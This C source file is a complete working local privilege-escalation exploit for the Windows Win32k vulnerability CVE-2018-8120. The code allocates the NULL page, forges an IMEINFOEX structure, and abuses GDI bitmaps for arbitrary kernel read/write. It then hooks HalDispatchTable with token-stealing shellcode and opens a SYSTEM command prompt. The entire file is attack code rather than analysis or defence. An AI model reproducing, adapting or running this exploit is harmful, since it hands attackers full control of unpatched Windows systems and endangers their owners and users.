#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>
#include "struct.h"

static
BOOL
__declspec(naked)
xxNtUserSetImeInfoEx(tagIMEINFOEX* imeInfoEx)
{
	__asm { mov eax, 1226h };
	__asm { lea edx, [esp + 4] };
	__asm { int 2eh };
	__asm { ret };
}

My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
tagIMEINFOEX iiFaked;
HWND hwndHunt = NULL;
PVOID pwndHunt = NULL;

static VOID ShellCode()
{
	_asm
	{
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx   // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

LPVOID NtkrnlpaBase()
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

		if (!strcmp(lpfileName, "ntkrnlpa.exe"))
		{
			printf("[+] success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD32 GetHalOffset_4()
{
	// ntkrnlpa.exe in kernel space base address
	PVOID pNtkrnlpaBase = NtkrnlpaBase();

	printf("[+] ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibrary(L"ntkrnlpa.exe");

	if (hUserSpaceBase == NULL)
	{
		printf("[+] Failed to get hUserSpaceBase !\n");
		system("pause");
		return 0;
	}

	// HalDispatchTable in user space address
	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
	
	if (pUserSpaceAddress == NULL)
	{
		printf("[+] Failed to get pUserSpaceAddress !\n");
		system("pause");
		return 0;
	}

	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;

	printf("[+] HalDispatchTable+0x4 is 0x%p\n", hal_4);

	return (DWORD32)hal_4;
}

VOID init_addr()
{
	// 申明函数
	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return 0;
	}

	// 零页申请内存
	PVOID Zero_addr = (PVOID)1;
	SIZE_T RegionSize = 0x1000;

	printf("[+] Started to alloc zero page");
	if (!NT_SUCCESS(NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || Zero_addr != NULL)
	{
		printf("[+] Failed to alloc zero page!\n");
		system("pause");
		return 0;
	}

	ZeroMemory(Zero_addr, RegionSize);
	printf(" => done!\n");
}

DWORD32 getGdiShreadHandleTableAddr()
{
	DWORD32 tebAddr = (PDWORD32)NtCurrentTeb();
	DWORD32 pebAddr = *(PDWORD32)((PUCHAR)tebAddr + 0x30);
	DWORD32 GdiShreadHandleTableAddr = *(PDWORD32)((PUCHAR)pebAddr + 0x94);
	return GdiShreadHandleTableAddr;
}

DWORD getBitMapAddr(HBITMAP hBitmap)
{
	WORD arrayIndex = LOWORD(hBitmap);
	return *(PDWORD)(getGdiShreadHandleTableAddr() + arrayIndex * sizeof(GDICELL_32));
}

VOID readOOB(DWORD32 whereRead, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereRead);
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// read
}

VOID writeOOB(DWORD32 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// write
}

VOID Construct_Fake()
{
	tagIMEINFOEX fakepiiex = { 0 };

	printf("[+] Start to Create WindowStation");
	// 新建一个新的窗口,新建的WindowStation对象其偏移0x14位置的spklList字段的值默认是零
	HWINSTA hSta = CreateWindowStation(
		0,				//LPCSTR                lpwinsta
		0,				//DWORD                 dwFlags
		READ_CONTROL,	//ACCESS_MASK           dwDesiredAccess
		0				//LPSECURITY_ATTRIBUTES lpsa
	);

	printf(" => done!\n");

	printf("[+] Start to SetProcessWindowStation");
	// 窗口与当前进程关联起来
	SetProcessWindowStation(hSta);
	
	printf(" => done!\n");

	//CHAR buf = (CHAR*)malloc(sizeof(CHAR)*0x100);
	CHAR buf[0x64 * 0x64 * 4];

	hManagerBitmap = CreateBitmap(0x101, 2, 1, 8, &buf);
	hWorkerBitmap = CreateBitmap(0x101, 2, 1, 8, &buf);
	//__debugbreak();
	DWORD leakManagerAddr = getBitMapAddr(hManagerBitmap);
	DWORD leakWorkerAddr = getBitMapAddr(hWorkerBitmap);

	printf("[+] hManagerBitmap address is 0x%p\n", leakManagerAddr);
	printf("[+] leakWorkerAddr address is 0x%p\n", leakWorkerAddr);

	DWORD pManagerPrvScan0 = leakManagerAddr + 0x30;
	DWORD pWorkerPrvScan0 = leakWorkerAddr + 0x30;

	printf("[+] pManagerPrvScan0 address is : 0x%p\n", pManagerPrvScan0);
	printf("[+] pWorkerPrvScan0 address is : 0x%p\n", pWorkerPrvScan0);
	//__debugbreak();

	DWORD* faketagKL = (DWORD*)0x0;
	// 手动构造 pWorkerPrvScan0 结构
	*(DWORD*)((PBYTE)& fakepiiex + 0x0) =  pWorkerPrvScan0;
	*(DWORD*)((PBYTE)& fakepiiex + 0x4) =  0x104;
	*(DWORD*)((PBYTE)& fakepiiex + 0x8) =  0x00001b97;
	*(DWORD*)((PBYTE)& fakepiiex + 0xC) =  0x00000003;
	*(DWORD*)((PBYTE)& fakepiiex + 0x10) = 0x00010000;
	*(DWORD*)((PBYTE)& fakepiiex + 0x18) = 0x04800200;
	printf("[+] piiex address is : 0x%p\n", fakepiiex); // pWorkerPrvScan0
	printf("[+] &piiex address is : 0x%p\n", &fakepiiex);
	printf("[+] faketagKL address is : 0x%p\n", faketagKL);
	// 绕过检验
	*(DWORD*)((PUCHAR)faketagKL + 0x14) = pWorkerPrvScan0;  // tagKL->hkl
	*(DWORD*)((PUCHAR)faketagKL + 0x2c) = pManagerPrvScan0; // tagKL->piiex
	//__debugbreak();
	xxNtUserSetImeInfoEx(&fakepiiex); // 拷贝函数实现 pManagerPrvScan0->pWorkerPrvScan0
	//__debugbreak();
}

VOID GetShell()
{
	DWORD interVal = 0;
	DWORD32 halHooked = GetHalOffset_4();

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	//__debugbreak();
	writeOOB(halHooked, (PVOID)& ShellCode, sizeof(DWORD32));
	// 1. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4
	// 2. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4->shellcode

	// 执行shellcode
	NtQueryIntervalProfile(0x1234, &interVal);
}

int main()
{
	printf("[+] CVE-2018-8120\n[+] Write by Thunder_J 2019.8\n");

	init_addr();
	
	Construct_Fake();
	
	GetShell();

	CreateCmd();

	system("pause");
	return 0;
}

